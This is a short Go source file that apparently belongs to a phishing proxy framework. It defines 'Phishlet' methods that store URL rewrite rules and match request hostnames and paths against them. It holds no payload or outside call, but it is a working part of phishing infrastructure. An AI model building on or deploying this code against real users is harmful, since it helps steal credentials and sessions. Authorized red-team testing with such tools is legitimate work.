package core

import (
	"fmt"
	"regexp"
	"strings"
)

// addRewriteUrl adds a URL rewrite rule to the phishlet
func (p *Phishlet) addRewriteUrl(trigger_domains []string, trigger_paths []string, rewrite_path string, query *[]ConfigRewriteQuery, exclude_keys *[]string) error {
	rw := RewriteUrl{
		id: GenRandomToken(),
	}

	// Parse trigger domains
	for _, d := range trigger_domains {
		rw.trigger.domains = append(rw.trigger.domains, strings.ToLower(d))
	}

	// Parse trigger paths
	for _, path := range trigger_paths {
		re, err := regexp.Compile("^" + path + "$")
		if err != nil {
			return fmt.Errorf("rewrite_urls: invalid trigger path regex: %v", err)
		}
		rw.trigger.paths = append(rw.trigger.paths, re)
	}

	// Set rewrite path
	rw.rewrite.path = rewrite_path

	// Parse query parameters
	if query != nil {
		for _, q := range *query {
			if q.Key != nil && q.Value != nil {
				rw.rewrite.query = append(rw.rewrite.query, RewriteQuery{
					key:   *q.Key,
					value: *q.Value,
				})
			}
		}
	}

	// Parse exclude keys
	if exclude_keys != nil {
		rw.rewrite.exclude_keys = *exclude_keys
	}

	p.rewrite_urls = append(p.rewrite_urls, rw)
	return nil
}

// GetRewriteUrl checks if a URL should be rewritten and returns the rewrite rule
func (p *Phishlet) GetRewriteUrl(hostname string, path string) (*RewriteUrl, bool) {
	for _, rw := range p.rewrite_urls {
		// Check domain match
		domain_matched := false
		for _, d := range rw.trigger.domains {
			if d == strings.ToLower(hostname) {
				domain_matched = true
				break
			}
		}

		if domain_matched {
			// Check path match
			for _, p_re := range rw.trigger.paths {
				if p_re.MatchString(path) {
					return &rw, true
				}
			}
		}
	}
	return nil, false
}
